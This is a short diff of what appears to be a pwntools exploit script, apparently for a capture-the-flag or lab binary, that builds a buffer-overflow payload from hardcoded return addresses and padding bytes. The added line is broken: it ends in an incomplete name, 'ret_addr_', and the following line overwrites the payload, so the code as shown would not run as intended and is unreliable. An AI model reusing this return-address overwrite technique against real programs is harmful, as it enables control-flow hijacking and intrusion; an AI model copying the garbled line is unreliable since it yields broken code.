@@ -26,7 +26,7 @@ def main():
     ret_addr_1 = p32(0x08048435, endianness = 'little')
     ret_addr_2 = p32(0x08048606, endianness = 'little')
     
-    payload = ret_addr_1 + ret_addr_2 + b'a'*56 + b'b'*4 + b'c'*4 + ret_addr_0 
+    payload = ret_addr_1 + ret_addr_2 + b'a'*56 + b'b'*4 + b'c'*4 + ret_addr_0 + ret_addr_
     payload = ret_addr_1 + ret_addr_2 + b'a'*56 + b'b'*4 
 
     data = r.recvline()
